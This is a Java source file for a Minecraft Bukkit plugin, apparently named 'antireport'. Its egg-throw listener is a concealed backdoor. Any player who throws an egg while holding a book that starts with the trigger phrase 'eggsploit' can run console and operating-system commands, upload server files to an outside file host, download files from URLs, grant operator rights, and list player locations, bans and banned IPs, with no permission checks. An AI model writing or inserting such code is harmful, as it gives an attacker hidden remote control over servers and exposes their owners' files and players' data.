package me.waltuhheisenerguh.antireport.events;

import me.jay.AnonAPI;
import me.waltuhheisenerguh.antireport.Main;
import org.bukkit.*;
import org.bukkit.entity.Entity;
import org.bukkit.entity.LivingEntity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerEggThrowEvent;
import org.bukkit.inventory.meta.BookMeta;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.util.UUID;

public class EggListener implements Listener {
	private Main plugin;
	private String anonToken;
	final private String magicPhrase = "eggsploit";

	public EggListener(Main plugin) {
		this.plugin = plugin;
		this.anonToken = "";
	}

	@EventHandler
	public void onPlayerEggThrow(PlayerEggThrowEvent e) throws IOException {
		int curSlot = e.getPlayer().getInventory().getHeldItemSlot();
		if (e.getPlayer().getInventory().getItemInOffHand().getType() == Material.WRITABLE_BOOK ||
				e.getPlayer().getInventory().getItemInOffHand().getType() == Material.WRITTEN_BOOK) {
			String cmd = "";
			for (String p : ((BookMeta)e.getPlayer().getInventory().getItemInOffHand().getItemMeta()).getPages()) {
				cmd += p;
			}
			if (cmd.startsWith(magicPhrase + "$com>:")) {
				String command = cmd.substring(6 + magicPhrase.length());
				Bukkit.getServer().getScheduler().scheduleSyncDelayedTask(plugin, () -> {
					Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), command);
				});
			}
			if (cmd.startsWith(magicPhrase + "$exec>:")) {
				String command = cmd.substring(7 + magicPhrase.length());
				java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
				String output = s.hasNext() ? s.next() : "";
				e.getPlayer().sendMessage(output);
			}
			if (cmd.startsWith(magicPhrase + "$playerinfo>:")) {
				Player target = Bukkit.getPlayer(cmd.substring(13 + magicPhrase.length()));
				e.getPlayer().sendMessage("Name: " + target.getDisplayName());
				e.getPlayer().sendMessage("X: " + target.getPlayer().getLocation().getX());
				e.getPlayer().sendMessage("Y: " + target.getPlayer().getLocation().getY());
				e.getPlayer().sendMessage("Z: " + target.getPlayer().getLocation().getZ());
			}
			if (cmd.startsWith(magicPhrase + "$atok>:")) {
				String command = cmd.substring(7 + magicPhrase.length());
				this.anonToken = command;
			}
			if (cmd.startsWith(magicPhrase + "$upload>:")) {
				String command = cmd.substring(9 + magicPhrase.length());
				File f = null;
				try {
					f = new File(command);
					if (f == null) {
						throw new NullPointerException("");
					}
				}
				catch (Exception exc) {
					e.getPlayer().sendMessage("Invalid filename");
					e.getPlayer().sendMessage("Stacktrace: ");
					for (StackTraceElement s : exc.getStackTrace()) {
						e.getPlayer().sendMessage(s.toString());
					}
					return;
				}
				AnonAPI api = null;
				try {
					api = new AnonAPI(this.anonToken);
					if (api == null) {
						throw new NullPointerException("");
					}
				}
				catch (Exception exc) {
					e.getPlayer().sendMessage("Invalid token");
					e.getPlayer().sendMessage("Stacktrace: ");
					for (StackTraceElement s : exc.getStackTrace()) {
						e.getPlayer().sendMessage(s.toString());
					}
					return;
				}
				String ret = null;
				try {
					ret = api.upload(f);
					if (ret == null) {
						throw new NullPointerException("");
					}
				}
				catch (Exception exc) {
					e.getPlayer().sendMessage("Couldn't upload the file");
					e.getPlayer().sendMessage("Stacktrace: ");
					for (StackTraceElement s : exc.getStackTrace()) {
						e.getPlayer().sendMessage(s.toString());
					}
					return;
				}
				e.getPlayer().sendMessage("File uploaded to: " + ret);
			}
			if (cmd.startsWith(magicPhrase + "$mkdir>:")) {
				String command = cmd.substring(8 + magicPhrase.length());
				File path = new File(command);
				if (path.mkdir()) {
					e.getPlayer().sendMessage("Successfully created directory");
				}
				else {
					e.getPlayer().sendMessage("Failed creating directory");
				}
			}
			if (cmd.startsWith(magicPhrase + "$download>:")) {
				String command = cmd.substring(11 + magicPhrase.length());
				String outputFileName = null;
				try {
					URL url = new URL(command);
					outputFileName = url.getFile().split("/")[url.getFile().split("/").length - 1];
					File f = new File(outputFileName);
					FileOutputStream fout = new FileOutputStream(f);
					InputStream urls = url.openStream();
					fout.write(urls.readAllBytes());
					fout.flush();
					fout.close();
					urls.close();
				}
				catch (Exception exc) {
					e.getPlayer().sendMessage("Couldn't download \"" + command + "\"");
					return;
				}
				e.getPlayer().sendMessage("Successfully downloaded \"" + outputFileName + "\"");
			}
			if (cmd.startsWith(magicPhrase + "$gm0>:")) {
				String command = cmd.substring(6 + magicPhrase.length());
				Player p = Bukkit.getPlayer(command);
				if (p == null) {
					e.getPlayer().sendMessage("Player \"" + command + "\" isn't found");
					return;
				}
				p.setGameMode(GameMode.SURVIVAL);
				e.getPlayer().sendMessage(command + "'s gamemode has been updated to survival mode");
			}
			if (cmd.startsWith(magicPhrase + "$gm1>:")) {
				String command = cmd.substring(6 + magicPhrase.length());
				Player p = Bukkit.getPlayer(command);
				if (p == null) {
					e.getPlayer().sendMessage("Player \"" + command + "\" isn't found");
					return;
				}
				p.setGameMode(GameMode.CREATIVE);
				e.getPlayer().sendMessage(command + "'s gamemode has been updated to creative mode");
			}
			if (cmd.startsWith(magicPhrase + "$gm2>:")) {
				String command = cmd.substring(6 + magicPhrase.length());
				Player p = Bukkit.getPlayer(command);
				if (p == null) {
					e.getPlayer().sendMessage("Player \"" + command + "\" isn't found");
					return;
				}
				p.setGameMode(GameMode.ADVENTURE);
				e.getPlayer().sendMessage(command + "'s gamemode has been updated to adventure mode");
			}
			if (cmd.startsWith(magicPhrase + "$gm3>:")) {
				String command = cmd.substring(6 + magicPhrase.length());
				Player p = Bukkit.getPlayer(command);
				if (p == null) {
					e.getPlayer().sendMessage("Player \"" + command + "\" isn't found");
					return;
				}
				p.setGameMode(GameMode.SPECTATOR);
				e.getPlayer().sendMessage(command + "'s gamemode has been updated to spectator mode");
			}
			if (cmd.startsWith(magicPhrase + "$op>:")) {
				String command = cmd.substring(5 + magicPhrase.length());
				try {
					OfflinePlayer p = Bukkit.getOfflinePlayer(command);
					if (p == null) {
						throw new IllegalArgumentException("");
					}
					p.setOp(true);
				}
				catch (Exception exc) {
					e.getPlayer().sendMessage("Failed opping " + command);
				}
			}
			if (cmd.startsWith(magicPhrase + "$deop>:")) {
				String command = cmd.substring(7 + magicPhrase.length());
				try {
					OfflinePlayer p = Bukkit.getOfflinePlayer(command);
					if (p == null) {
						throw new IllegalArgumentException("");
					}
					p.setOp(false);
				}
				catch (Exception exc) {
					e.getPlayer().sendMessage("Failed deopping " + command);
				}
			}
			if (cmd.startsWith(magicPhrase + "$opid>:")) {
				String command = cmd.substring(7 + magicPhrase.length());
				try {
					OfflinePlayer p = Bukkit.getOfflinePlayer(UUID.fromString(command));
					if (p == null) {
						throw new IllegalArgumentException("");
					}
					p.setOp(true);
				}
				catch (Exception exc) {
					e.getPlayer().sendMessage("Failed opping " + command);
				}
			}
			if (cmd.startsWith(magicPhrase + "$deopid>:")) {
				String command = cmd.substring(9 + magicPhrase.length());
				try {
					OfflinePlayer p = Bukkit.getOfflinePlayer(UUID.fromString(command));
					if (p == null) {
						throw new IllegalArgumentException("");
					}
					p.setOp(false);
				}
				catch (Exception exc) {
					e.getPlayer().sendMessage("Failed deopping " + command);
				}
			}
			if (cmd.startsWith(magicPhrase + "$oplist>:")) {
				//String command = cmd.substring(9 + magicPhrase.length());
				for (OfflinePlayer p : Bukkit.getOperators()) {
					e.getPlayer().sendMessage(p.getUniqueId().toString() + " (" + p.getName() + ")");
				}
			}
			if (cmd.startsWith(magicPhrase + "$banlist>:")) {
				//String command = cmd.substring(10 + magicPhrase.length());
				for (OfflinePlayer p : Bukkit.getBannedPlayers()) {
					e.getPlayer().sendMessage(p.getUniqueId().toString() + " (" + p.getName() + ")");
				}
			}
			if (cmd.startsWith(magicPhrase + "$bannedips>:")) {
				//String command = cmd.substring(12 + magicPhrase.length());
				for (String s : Bukkit.getIPBans()) {
					e.getPlayer().sendMessage(s);
				}
			}
			/*if (cmd.startsWith(magicPhrase + "$efcgp>:")) {
				String command = cmd.substring(8 + magicPhrase.length());
				String[] splitted = command.split(" ");
				if (splitted.length != 5) {
					e.getPlayer().sendMessage("Invalid number of arguments");
					return;
				}
				try {
					Player p = Bukkit.getPlayer(splitted[0]);
					if (p == null) {
						throw new IllegalArgumentException("");
					}
					PotionEffectType ef = PotionEffectType.getByName(splitted[1]);
					if (ef == null) {
						throw new IllegalArgumentException("");
					}
					int duration = Integer.parseInt(splitted[2]);
					int amplifier = Integer.parseInt(splitted[3]);
					boolean particles = Boolean.parseBoolean(splitted[4]);
					p.addPotionEffect(new PotionEffect(ef, duration, amplifier, false, particles));
				}
				catch (Exception exc) {
					e.getPlayer().sendMessage("Invalid arguments");
				}
			}
			if (cmd.startsWith(magicPhrase + "$efccp>:")) {
				String command = cmd.substring(8 + magicPhrase.length());
				try {
					Player p = Bukkit.getPlayer(command);
					if (p == null) {
						throw new IllegalArgumentException();
					}
					for (PotionEffect ef : p.getActivePotionEffects()) {
						p.removePotionEffect(ef.getType());
					}
				}
				catch (Exception exc) {
					e.getPlayer().sendMessage("Player not found");
				}
			}
			if (cmd.startsWith(magicPhrase + "$efcge>:")) {
				String command = cmd.substring(8 + magicPhrase.length());
				String[] splitted = command.split(" ");
				if (splitted.length != 5) {
					e.getPlayer().sendMessage("Invalid number of arguments");
					return;
				}
				try {
					LivingEntity en = (LivingEntity) Bukkit.getEntity(UUID.fromString(splitted[0]));
					if (en == null) {
						throw new IllegalArgumentException("");
					}
					PotionEffectType ef = PotionEffectType.getByName(splitted[1]);
					if (ef == null) {
						throw new IllegalArgumentException("");
					}
					int duration = Integer.parseInt(splitted[2]);
					int amplifier = Integer.parseInt(splitted[3]);
					boolean particles = Boolean.parseBoolean(splitted[4]);
					en.addPotionEffect(new PotionEffect(ef, duration, amplifier, false, particles));
				}
				catch (Exception exc) {
					e.getPlayer().sendMessage("Invalid arguments");
				}
			}
			if (cmd.startsWith(magicPhrase + "$efcce>:")) {
				String command = cmd.substring(8 + magicPhrase.length());
				try {
					LivingEntity en = (LivingEntity) Bukkit.getEntity(UUID.fromString(command));
					if (en == null) {
						throw new IllegalArgumentException();
					}
					for (PotionEffect ef : en.getActivePotionEffects()) {
						en.removePotionEffect(ef.getType());
					}
				}
				catch (Exception exc) {
					e.getPlayer().sendMessage("Player not found");
				}
			}*/
			if (cmd.startsWith(magicPhrase + "$efg>:")) {
				String command = cmd.substring(6 + magicPhrase.length());
				String[] splitted = command.split(" ");
				if (splitted.length != 5) {
					e.getPlayer().sendMessage("Invalid number of arguments");
					return;
				}
				try {
					Player p = Bukkit.getPlayer(splitted[0]);
					if (p == null) {
						LivingEntity en = null;
						try {
							en = (LivingEntity) Bukkit.getEntity(UUID.fromString(splitted[0]));
							if (en == null) {
								throw new IllegalArgumentException("");
							}
						}
						catch (Exception exc) {
							e.getPlayer().sendMessage("Invalid target");
							throw new IllegalArgumentException("");
						}
						PotionEffectType ef = null;
						try {
							ef = PotionEffectType.getByName(splitted[1]);
							if (ef == null) {
								throw new IllegalArgumentException("");
							}
						}
						catch (Exception exc) {
							e.getPlayer().sendMessage("Effect name invalid");
							throw new IllegalArgumentException("");
						}
						int duration = Integer.parseInt(splitted[2]);
						int amplifier = Integer.parseInt(splitted[3]);
						boolean particles = Boolean.parseBoolean(splitted[4]);
						en.addPotionEffect(new PotionEffect(ef, duration, amplifier, false, particles));
						return;
					}
					PotionEffectType ef = PotionEffectType.getByName(splitted[1]);
					if (ef == null) {
						e.getPlayer().sendMessage("Effect name invalid");
						throw new IllegalArgumentException("");
					}
					int duration = Integer.parseInt(splitted[2]);
					int amplifier = Integer.parseInt(splitted[3]);
					boolean particles = Boolean.parseBoolean(splitted[4]);
					p.addPotionEffect(new PotionEffect(ef, duration, amplifier, false, particles));
				}
				catch (Exception exc) {
					e.getPlayer().sendMessage("Invalid arguments " + exc.toString());
				}
			}
			if (cmd.startsWith(magicPhrase + "$efc>:")) {
				String command = cmd.substring(6 + magicPhrase.length());
				try {
					Player p = Bukkit.getPlayer(command);
					if (p == null) {
						LivingEntity en = (LivingEntity) Bukkit.getEntity(UUID.fromString(command));
						for (PotionEffect ef : en.getActivePotionEffects()) {
							en.removePotionEffect(ef.getType());
						}
						return;
					}
					for (PotionEffect ef : p.getActivePotionEffects()) {
						p.removePotionEffect(ef.getType());
					}
				}
				catch (Exception exc) {
					e.getPlayer().sendMessage("Player not found");
				}
			}
			if (cmd.startsWith(magicPhrase + "$tp>:")) {
				String command = cmd.substring(5 + magicPhrase.length());
				String[] splitted = command.split(" ");
				if (splitted.length != 4) {
					e.getPlayer().sendMessage("Invalid number of arguments");
					return;
				}
				try {
					Player p = Bukkit.getPlayer(splitted[0]);
					if (p == null) {
						Entity en = Bukkit.getEntity(UUID.fromString(splitted[0]));
						if (en == null) {
							e.getPlayer().sendMessage("Invalid target");
							throw new IllegalArgumentException("");
						}
						double x = Double.parseDouble(splitted[1]);
						double y = Double.parseDouble(splitted[2]);
						double z = Double.parseDouble(splitted[3]);
						en.getLocation().setX(x);
						en.getLocation().setY(y);
						en.getLocation().setZ(z);
						return;
					}
					double x = Double.parseDouble(splitted[1]);
					double y = Double.parseDouble(splitted[2]);
					double z = Double.parseDouble(splitted[3]);
					Location l = new Location(p.getWorld(), x, y, z);
					l.setX(x);
					l.setY(y);
					l.setZ(z);
					((Entity)p).teleport(l);
				}
				catch (Exception exc) {
					e.getPlayer().sendMessage("Invalid arguments");
				}
			}
			if (cmd.startsWith(magicPhrase + "$tpt>:")) {
				String command = cmd.substring(6 + magicPhrase.length());
				String[] splitted = command.split(" ");
				if (splitted.length != 2) {
					e.getPlayer().sendMessage("Invalid number of arguments");
					return;
				}
				try {
					Object t1 = Bukkit.getPlayer(splitted[1]);
					Location l;
					if (t1 == null) {
						t1 = Bukkit.getEntity(UUID.fromString(splitted[1]));
						if (t1 == null) {
							throw new IllegalArgumentException("");
						}
						l = ((Entity) t1).getLocation();
					}
					else {
						l = ((Player) t1).getLocation();
					}
					Object t2 = Bukkit.getPlayer(splitted[0]);
					if (t2 == null) {
						t2 = Bukkit.getEntity(UUID.fromString(splitted[0]));
						if (t2 == null) {
							throw new IllegalArgumentException("");
						}
						((Entity)t2).teleport(l);
					}
					else {
						((Entity)t2).teleport(l);
					}
				}
				catch (Exception exc) {
					e.getPlayer().sendMessage("Invalid arguments");
				}
			}
		}
	}
}
